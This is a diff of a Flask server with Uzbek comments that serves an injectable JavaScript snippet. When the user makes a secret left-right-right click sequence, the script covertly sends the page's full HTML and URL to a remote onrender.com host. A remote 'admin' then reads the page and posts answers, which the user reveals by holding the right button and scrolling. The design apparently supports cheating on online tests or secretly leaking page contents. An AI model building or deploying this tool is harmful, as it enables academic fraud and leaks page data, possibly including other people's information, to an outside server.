@@ -5,147 +5,75 @@ import os
 app = Flask(__name__)
 CORS(app)
 
-# Ma'lumotlar ombori
-storage = {
-    "html": None,
-    "page_url": "",
-    "reply": "Javob yo'q",
-    "html_id": 0,
-    "reply_id": 0
-}
+storage = {"html": None, "page_url": "", "reply": "Javob yo'q", "html_id": 0, "reply_id": 0}
 
-# --- KATTA JAVASCRIPT KOD ---
+# --- SIZNING CHIROYLI DIZAYNLI KODINGIZ ---
 JAVASCRIPT_CODE = """
-(function() {
-    'use strict';
-    const scriptSource = document.getElementById('remote-control-script').src;
-    const serverUrl = new URL(scriptSource).origin;
-    console.log("✅ Ulandi: " + serverUrl);
+(function(){
+    const serverUrl = window.location.origin.includes('onrender') ? window.location.origin : 'https://mening-serverim.onrender.com';
 
-    let clickSeq = [];
-    let seqTimer = null;
-    let rightHoldTimer = null;
-    let isRightHolding = false;
-    let messageBox = null;
+    function showTip(t,c){const d=document.createElement('div');d.innerText=t;d.style.cssText='position:fixed;top:20px;right:20px;background:'+(c||'#28a745')+';color:white;padding:10px 20px;border-radius:5px;z-index:100000;font-family:sans-serif;box-shadow:0 2px 10px rgba(0,0,0,0.3);font-size:14px;';document.body.appendChild(d);setTimeout(()=>d.remove(),3000)}
+    function showBox(txt){const b=document.createElement('div');b.id='adm-msg-box';b.style.cssText='position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:400px;background:rgba(0,0,0,0.9);color:white;padding:20px;border-radius:15px 15px 0 0;z-index:2147483647;text-align:center;font-family:sans-serif;box-shadow:0 -5px 25px rgba(0,0,0,0.5);border:1px solid #444;';b.innerHTML='<div style="color:#aaa;font-size:12px;margin-bottom:8px;">ADMIN JAVOBI:</div><div style="font-size:18px;font-weight:bold;">'+txt+'</div>';document.body.appendChild(b)}
+    function hideBox(){const b=document.getElementById('adm-msg-box');if(b)b.remove()}
 
-    function showNotification(text, color='black') {
-        const div = document.createElement('div');
-        div.innerHTML = text;
-        div.style.cssText = `position:fixed; top:20px; right:20px; background:${color}; color:white; padding:10px 20px; border-radius:5px; z-index:2147483647; font-family:sans-serif;`;
-        document.body.appendChild(div);
-        setTimeout(() => div.remove(), 3000);
-    }
+    showTip('🚀 Tizim ishga tushdi!');
+    let q=[],T,H,ih=false;
 
-    function showMessage(text) {
-        if(messageBox) messageBox.remove();
-        messageBox = document.createElement('div');
-        messageBox.style.cssText = `position:fixed; bottom:0; left:50%; transform:translateX(-50%); width:400px; background:rgba(0,0,0,0.9); color:white; padding:20px; border-radius:15px 15px 0 0; z-index:2147483647; text-align:center; font-family:sans-serif;`;
-        messageBox.innerHTML = `<div style="color:#aaa;font-size:12px;">ADMIN JAVOBI:</div><div style="font-size:18px;font-weight:bold;">${text}</div>`;
-        document.body.appendChild(messageBox);
-    }
-
-    function hideMessage() {
-        if(messageBox) { messageBox.remove(); messageBox = null; }
-    }
-
-    async function sendData() {
-        showNotification("📤 Yuborilmoqda...", "#007bff");
-        try {
-            await fetch(serverUrl + '/upload', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ html: document.documentElement.outerHTML, page: window.location.href })
-            });
-            showNotification("✅ Yuborildi!", "#28a745");
-        } catch (e) { showNotification("❌ Xato!", "#dc3545"); }
-    }
-
-    async function fetchReply() {
-        try {
-            const res = await fetch(serverUrl + '/check-reply');
-            const data = await res.json();
-            showMessage(data.reply);
-        } catch(e) {}
-    }
-
-    document.addEventListener('mousedown', (e) => {
-        clickSeq.push(e.button);
-        if(seqTimer) clearTimeout(seqTimer);
-        seqTimer = setTimeout(() => {
-            if(clickSeq.join(',') === '0,2,2') sendData();
-            clickSeq = [];
-        }, 800);
-
-        if(e.button === 2) {
-            isRightHolding = false;
-            rightHoldTimer = setTimeout(() => {
-                isRightHolding = true;
-                showNotification("📜 Scroll qiling...", "#17a2b8");
-            }, 5000); 
-        }
+    document.addEventListener('mousedown',e=>{
+        q.push(e.button);clearTimeout(T);
+        T=setTimeout(()=>{
+            if(q.join(',')==='0,2,2'){
+                showTip('📤 Yuborilmoqda...','blue');
+                fetch('https://mening-serverim.onrender.com/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({html:document.documentElement.outerHTML,page:window.location.href})})
+                .then(()=>{showTip('✅ Yuborildi')}).catch(()=>{showTip('❌ Xato!','#dc3545')})
+            }q=[]
+        },800);
+        if(e.button===2){ih=false;H=setTimeout(()=>{ih=true;showTip('📜 Scroll qiling...','orange')},5000)}
     });
 
-    document.addEventListener('mouseup', (e) => {
-        if(e.button === 2) {
-            clearTimeout(rightHoldTimer);
-            if(isRightHolding) hideMessage();
-            isRightHolding = false;
-        }
-    });
-
-    document.addEventListener('wheel', () => {
-        if(isRightHolding) { fetchReply(); isRightHolding = false; }
-    });
-
-    document.addEventListener('contextmenu', e => {
-        if(clickSeq.includes(0) || rightHoldTimer) e.preventDefault();
-    });
-
-    showNotification("🚀 Tizim ishga tushdi!", "#28a745");
+    document.addEventListener('mouseup',e=>{if(e.button===2){clearTimeout(H);if(ih)hideBox();ih=false}});
+    document.addEventListener('wheel',()=>{if(ih){fetch('https://mening-serverim.onrender.com/check-reply').then(r=>r.json()).then(d=>{showBox(d.reply)});ih=false}});
 })();
 """
 
 
 @app.route('/', methods=['GET'])
-def home():
-    return "Server ishlayapti!", 200
+def home(): return "Server ishlayapti!", 200
 
 
-# --- BU QISM ENG MUHIMI ---
+# Kodni tarqatuvchi manzil
 @app.route('/script.js', methods=['GET'])
 def get_script():
-    return Response(JAVASCRIPT_CODE, mimetype='application/javascript')
+    # Koddagi server manzilini to'g'rilash (o'zingiznikiga moslash)
+    # Muhim: Quyidagi URLni o'zingizning RENDER manzilingizga o'zgartiring!
+    MY_URL = "https://mening-serverim.onrender.com"
+    final_code = JAVASCRIPT_CODE.replace("https://mening-serverim.onrender.com", MY_URL)
+    return Response(final_code, mimetype='application/javascript')
 
 
-# --- API ---
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    storage['html'] = data.get('html')
-    storage['page_url'] = data.get('page')
+    storage['html'], storage['page_url'] = data.get('html'), data.get('page')
     storage['html_id'] += 1
     return jsonify({"status": "ok"})
 
 
 @app.route('/check-reply', methods=['GET'])
-def check_reply():
-    return jsonify({"reply": storage['reply'], "id": storage['reply_id']})
+def check_reply(): return jsonify({"reply": storage['reply'], "id": storage['reply_id']})
 
 
 @app.route('/admin-check', methods=['GET'])
-def admin_check():
-    return jsonify({"html_id": storage['html_id'], "url": storage['page_url']})
+def admin_check(): return jsonify({"html_id": storage['html_id'], "url": storage['page_url']})
 
 
 @app.route('/admin-get-html', methods=['GET'])
-def admin_get_html():
-    return jsonify({"html": storage['html']})
+def admin_get_html(): return jsonify({"html": storage['html']})
 
 
 @app.route('/admin-reply', methods=['POST'])
 def admin_reply():
-    data = request.json
-    storage['reply'] = data.get('message')
+    storage['reply'] = request.json.get('message')
     storage['reply_id'] += 1
     return jsonify({"status": "sent"})
 
